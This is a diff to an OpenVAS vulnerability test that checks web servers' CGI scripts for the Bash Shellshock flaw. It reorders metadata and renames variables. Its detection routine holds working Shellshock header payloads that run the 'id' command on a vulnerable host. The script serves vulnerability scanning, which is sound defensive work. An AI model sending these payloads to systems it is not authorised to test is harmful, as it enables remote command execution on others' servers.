@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bash_shellshock_remote_cmd_exec_vuln.nasl 9438 2018-04-11 10:28:36Z cfischer $
+# $Id: gb_bash_shellshock_remote_cmd_exec_vuln.nasl 10736 2018-08-02 11:55:29Z cfischer $
 #
 # GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability
 #
@@ -28,53 +28,54 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804489");
-  script_version("$Revision: 9438 $");
-  script_cve_id("CVE-2014-6271","CVE-2014-6278");
+  script_version("$Revision: 10736 $");
+  script_cve_id("CVE-2014-6271", "CVE-2014-6278");
   script_bugtraq_id(70103);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-11 12:28:36 +0200 (Wed, 11 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-02 13:55:29 +0200 (Thu, 02 Aug 2018) $");
   script_tag(name:"creation_date", value:"2014-09-25 18:47:16 +0530 (Thu, 25 Sep 2014)");
   script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability");
-
-  script_tag(name: "summary" , value:"This host is installed with GNU Bash Shell
-  and is prone to remote command execution vulnerability.");
-
-  script_tag(name: "vuldetect" , value:"Send a crafted command via HTTP GET
-  request and check remote command execution.");
-
-  script_tag(name: "insight" , value:"GNU bash contains a flaw that is triggered
-  when evaluating environment variables passed from another environment.
-  After processing a function definition, bash continues to process trailing
-  strings.");
-
-  script_tag(name: "impact" , value:"Successful exploitation will allow remote
-  or local attackers to inject  shell commands, allowing local privilege
-  escalation or remote command execution depending on the application vector.
-
-  Impact Level: Application");
-
-  script_tag(name: "affected" , value:"GNU Bash through 4.3");
-
-  script_tag(name: "solution" , value:"Apply the patch or upgrade to latest version,
-  For updates refer to http://www.gnu.org/software/bash/");
-
-  script_xref(name : "URL" , value : "https://access.redhat.com/solutions/1207723");
-  script_xref(name : "URL" , value : "https://bugzilla.redhat.com/show_bug.cgi?id=1141597");
-  script_xref(name : "URL" , value : "https://blogs.akamai.com/2014/09/environment-bashing.html");
-  script_xref(name : "URL" , value : "https://community.qualys.com/blogs/securitylabs/2014/09/24/");
   script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
-  script_tag(name:"solution_type", value:"VendorFix");
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl", "webmirror.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_add_preference(name:"Shellshock: Check CGIs in KB:", type:"checkbox", value:"no");
 
+  script_xref(name:"URL", value:"https://access.redhat.com/solutions/1207723");
+  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=1141597");
+  script_xref(name:"URL", value:"https://blogs.akamai.com/2014/09/environment-bashing.html");
+  script_xref(name:"URL", value:"https://community.qualys.com/blogs/securitylabs/2014/09/24/");
+
+  script_tag(name:"summary", value:"This host is installed with GNU Bash Shell
+  and is prone to remote command execution vulnerability.");
+
+  script_tag(name:"vuldetect", value:"Send a crafted command via HTTP GET
+  request and check remote command execution.");
+
+  script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered
+  when evaluating environment variables passed from another environment.
+  After processing a function definition, bash continues to process trailing
+  strings.");
+
+  script_tag(name:"impact", value:"Successful exploitation will allow remote
+  or local attackers to inject  shell commands, allowing local privilege
+  escalation or remote command execution depending on the application vector.
+
+  Impact Level: Application");
+
+  script_tag(name:"affected", value:"GNU Bash through 4.3");
+
+  script_tag(name:"solution", value:"Apply the patch or upgrade to latest version,
+  For updates refer to http://www.gnu.org/software/bash/");
+
   script_timeout(600);
+
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"VendorFix");
 
   exit(0);
 }
@@ -149,9 +150,9 @@ cgis[i++] = '/cgi-bin/pathtest.pl';
 cgis[i++] = '/cgi-bin/contact.cgi';
 cgis[i++] = '/cgi-bin/uname.cgi';
 
-function _check( url, http_port, host )
+function _check( url, port, host )
 {
-  attacks = make_list( 
+  attacks = make_list(
                       '() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;',
                       '() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }'
                      );
@@ -159,31 +160,31 @@ function _check( url, http_port, host )
   foreach attack ( attacks )
   {
     foreach method ( make_list( "GET","POST") )
-    {  
+    {
       foreach http_field (make_list("User-Agent:", "Referer:", "Cookie:", "OpenVAS:"))
       {
         sndReq = string( method," ", url, " HTTP/1.1\r\n",
                         "Host: ", host, "\r\n",
-                         http_field, attack, "\r\n", 
+                         http_field, attack, "\r\n",
                          "Connection: close\r\n",
                          "Accept: */*\r\n\r\n");
-        rcvRes = http_send_recv(port:http_port, data:sndReq);
- 
+        rcvRes = http_send_recv(port:port, data:sndReq);
+
         if(rcvRes =~ "uid=[0-9]+\(.*gid=[0-9]+\(.*")
         {
           uid = eregmatch(pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:rcvRes );
 
-          report = 'By requesting the URL "' + url + '" with the "' + http_field + '" header set to\n"' + 
+          report = 'By requesting the URL "' + url + '" with the "' + http_field + '" header set to\n"' +
                    attack + '"\nit was possible to execute the "id" command.\n\nResult: ' + uid[1] + '\n';
 
           expert_info = 'Request:\n'+ sndReq + 'Response:\n' + rcvRes + '\n';
 
-          security_message( port:http_port, data:report, expert_info:expert_info );
+          security_message( port:port, data:report, expert_info:expert_info );
           exit(0);
         }
       }
     }
-  }  
+  }
 }
 
 function add_files( extensions )
@@ -213,24 +214,26 @@ function add_files( extensions )
   }
 }
 
-http_port = get_http_port(default:80);
+port = get_http_port( default:80 );
 
-check_kb_cgis = script_get_preference("Shellshock: Check CGIs in KB:");
+check_kb_cgis = script_get_preference( "Shellshock: Check CGIs in KB:" );
 
 if( check_kb_cgis == "yes" )
 {
-  extensions = get_kb_list("www/" + http_port + "/content/extensions/*");
+  # nb: This is expected to be here, we're using the same call later to add the port to the host header...
+  host = http_host_name( dont_add_port:TRUE );
+  extensions = get_http_kb_file_extensions( port:port, host:host, ext:"*" );
   if( extensions ) add_files( extensions:extensions );
 
-  kb_cgis = get_kb_list("www/" + http_port + "/cgis");
+  kb_cgis = get_http_kb_cgis( port:port, host:host );
   if( kb_cgis ) add_files( extensions:kb_cgis );
 }
 
-host = http_host_name( port:http_port );
+host = http_host_name( port:port );
 
 foreach dir ( cgis )
 {
-  _check( url:dir, http_port:http_port, host:host );
+  _check( url:dir, port:port, host:host );
 }
 
 exit( 99 );
